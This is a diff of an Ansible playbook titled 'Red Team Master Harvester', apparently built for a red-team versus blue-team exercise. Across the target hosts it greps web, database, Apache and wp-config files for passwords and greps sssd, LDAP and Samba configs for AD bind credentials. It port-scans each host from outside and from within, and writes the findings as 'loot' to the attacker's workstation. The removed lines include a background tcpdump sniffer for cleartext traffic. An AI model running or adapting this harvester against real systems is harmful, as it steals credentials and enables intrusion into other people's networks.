@@ -1,89 +1,73 @@
 ---
-- name: Execute Red Team Master Harvester
-  hosts: blue_team
-  gather_facts: no  # Bypasses Python discovery and /tmp directory errors
-  vars:
-    loot_root: "{{ playbook_dir }}/loot/{{ inventory_hostname }}"
+# SECTION 0: PREPARATION
+- name: Create Local Loot Directory
+  delegate_to: localhost
+  file:
+    path: "{{ playbook_dir }}/loot/{{ inventory_hostname }}"
+    state: directory
+  become: no
 
-  tasks:
-    # --- SECTION 0: PREPARATION ---
-    - name: Create Local Loot Directory
-      delegate_to: localhost
-      file:
-        path: "{{ loot_root }}"
-        state: directory
-      become: no
+# SECTION 1: DATABASE & WEB CREDENTIALS
+- name: Extract Database and Web Credentials
+  become: yes
+  shell: |
+    grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null | grep -vE "(\.png|\.jpg|\.svg|\.gif)" || true
+    grep -rE "DB_(PASSWORD|USER|HOST|NAME)" /var/www/html/wp-config.php 2>/dev/null || true
+  register: db_results
+  changed_when: false
 
-    # --- SECTION 1: DATABASE & WEB CREDENTIALS ---
-    - name: Extract Database and Web Credentials
-      become: yes
-      shell: |
-        grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null | grep -vE "(\.png|\.jpg|\.svg|\.gif)" || true
-        grep -rE "DB_(PASSWORD|USER|HOST|NAME)" /var/www/html/wp-config.php 2>/dev/null || true
-      register: db_results
-      changed_when: false
+# SECTION 2: EXTERNAL PORT SCAN (Workstation View)
+- name: Scan Target Ports from Red Workstation
+  delegate_to: localhost
+  shell: "nmap -Pn -sT --open -p 22,80,443,3306,3389,5432,8443 {{ inventory_hostname }} | grep 'open' | column -t"
+  register: ext_port_scan
+  become: no
+  ignore_errors: yes
 
-    # --- SECTION 2: EXTERNAL PORT SCAN (Workstation View) ---
-    - name: Scan Target Ports from Red Workstation
-      delegate_to: localhost
-      shell: "nmap -Pn -sT --open -p 22,80,443,3306,3389,5432,8443 {{ inventory_hostname }} | grep 'open' | column -t"
-      register: ext_port_scan
-      become: no
-      ignore_errors: yes
+# SECTION 2.5: INTERNAL PORT SCAN (Target View)
+- name: Scan Target Ports from the Target Itself
+  become: yes
+  shell: "nmap -sT --open -p 22,80,443,3306,3389,5432,8443 localhost | grep 'open' | column -t"
+  register: int_port_scan
+  ignore_errors: yes
 
-    # --- SECTION 2.5: INTERNAL PORT SCAN (Target View - Finds Hidden Services) ---
-    - name: Scan Target Ports from the Target Itself
-      become: yes
-      shell: "nmap -sT --open -p 22,80,443,3306,3389,5432,8443 localhost | grep 'open' | column -t"
-      register: int_port_scan
-      ignore_errors: yes
+# SECTION 3: AD/LDAP BIND INFO
+- name: Extract AD and LDAP Bind Info
+  become: yes
+  shell: |
+    grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server|ldap_uri|ldap_password)" /etc/sssd /etc/ldap /etc/samba 2>/dev/null | sort -u
+  register: ad_bind_results
+  failed_when: false
 
-    # --- SECTION 3: AD/LDAP BIND INFO ---
-    - name: Extract AD and LDAP Bind Info
-      become: yes
-      shell: |
-        grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server|ldap_uri|ldap_password)" /etc/sssd /etc/ldap /etc/samba 2>/dev/null | sort -u
-      register: ad_bind_results
-      failed_when: false
+# SECTION 4: DELIVERY
+- name: Deliver Organized Service Loot
+  delegate_to: localhost
+  copy:
+    content: |
+      === SERVICE HARVEST: {{ inventory_hostname }} ===
+      
+      [EXTERNAL PORTS (Firewall View)]
+      {{ ext_port_scan.stdout | default('No external ports responding') }}
 
-    # --- SECTION 4: DELIVERY (Updated for Comparison) ---
-    - name: Deliver Organized Service Loot
-      delegate_to: localhost
-      copy:
-        content: |
-          === SERVICE HARVEST: {{ inventory_hostname }} ===
-          
-          [EXTERNAL PORTS (Firewall View)]
-          {{ ext_port_scan.stdout | default('No external ports responding') }}
+      [INTERNAL PORTS (The "Hidden" View)]
+      {{ int_port_scan.stdout | default('Nmap not installed on target') }}
 
-          [INTERNAL PORTS (The "Hidden" View)]
-          {{ int_port_scan.stdout | default('Nmap not installed on target') }}
+      [DATABASE & WEB AUTH]
+      {{ db_results.stdout | default('None') }}
 
-          [DATABASE & WEB AUTH]
-          {{ db_results.stdout | default('No DB/Web credentials found') }}
+      [AD/LDAP BIND]
+      {{ ad_bind_results.stdout | default('None') }}
+    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/service_creds.txt"
+  become: no
 
-          [AD/LDAP BIND]
-          {{ ad_bind_results.stdout | default('No AD bind info found') }}
-        dest: "{{ loot_root }}/service_creds.txt"
-      become: no
-
-    # --- SECTION 5: LIVE ALERT (More Intuitive Debug) ---
-    - name: CATEGORIZED LOOT ALERT
-      debug:
-        msg:
-          - "--- TARGET: {{ inventory_hostname }} ---"
-          - "--- FIREWALL VIEW ---"
-          - "{{ ext_port_scan.stdout_lines | default(['Filtered/Closed']) }}"
-          - "--- INTERNAL VIEW (Bypasses Firewall) ---"
-          - "{{ int_port_scan.stdout_lines | default(['N/A']) }}"
-          - "--- DB/WEB CREDS ---"
-          - "{{ db_results.stdout_lines | default(['None Found']) }}"
-
-    # --- SECTION 6: NOISY NETWORK SNIFFER (Background Intel) ---
-    - name: Start Background Network Sniffer
-      delegate_to: localhost
-      run_once: true
-      become: yes
-      shell: |
-        # Ensure interface name (ens8) matches your workstation config
-        nohup tcpdump -i ens8 -A -nn -l 'port 80 or port 21 or port 23' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
+# SECTION 5: LIVE ALERT
+- name: CATEGORIZED LOOT ALERT
+  debug:
+    msg:
+      - "--- TARGET: {{ inventory_hostname }} ---"
+      - "--- FIREWALL VIEW ---"
+      - "{{ ext_port_scan.stdout_lines | default(['Filtered/Closed']) }}"
+      - "--- INTERNAL VIEW (Bypasses Firewall) ---"
+      - "{{ int_port_scan.stdout_lines | default(['N/A']) }}"
+      - "--- DB/WEB CREDS ---"
+      - "{{ db_results.stdout_lines | default(['None Found']) }}"
